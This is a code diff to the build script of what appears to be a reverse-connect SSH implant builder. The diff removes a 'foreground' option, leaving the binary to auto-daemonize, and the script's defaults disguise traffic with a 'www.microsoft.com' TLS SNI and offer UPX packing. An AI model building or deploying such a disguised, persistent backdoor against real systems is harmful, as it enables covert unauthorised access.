@@ -34,7 +34,6 @@ TLS_SNI="www.microsoft.com"
 LUSER="svc"
 PUBKEY=""
 NOCLI=""
-FOREGROUND=""
 BPORT="0"
 DRY_RUN=false
 COMPRESS=false
@@ -64,7 +63,6 @@ ${TEAL}Options:${RESET}
     ${YELLOW}--user <name>${RESET}       SSH username (default: svc)
     ${YELLOW}--pubkey <key>${RESET}      Authorized public key (base64)
     ${YELLOW}--nocli${RESET}             Disable CLI argument parsing in binary
-    ${YELLOW}--foreground${RESET}         Don't auto-daemonize (stay in foreground)
     ${YELLOW}--bind-port <port>${RESET}  Additional bind port after reverse connect
     ${YELLOW}--target <triple>${RESET}   Cross-compile for specified target (e.g., x86_64-unknown-linux-musl)
     ${YELLOW}--compress${RESET}          Compress with UPX after building
@@ -212,7 +210,6 @@ build() {
     export NEAP_TLS_SNI="$TLS_SNI"
     export NEAP_PUBKEY="$PUBKEY"
     export NEAP_NOCLI="$NOCLI"
-    export NEAP_FOREGROUND="$FOREGROUND"
 
     if [ "$MODE" = "reverse" ]; then
         export NEAP_LHOST="$HOST"
@@ -415,9 +412,6 @@ main() {
                 ;;
             --nocli)
                 NOCLI="1"
-                ;;
-            --foreground)
-                FOREGROUND="1"
                 ;;
             --bind-port)
                 shift
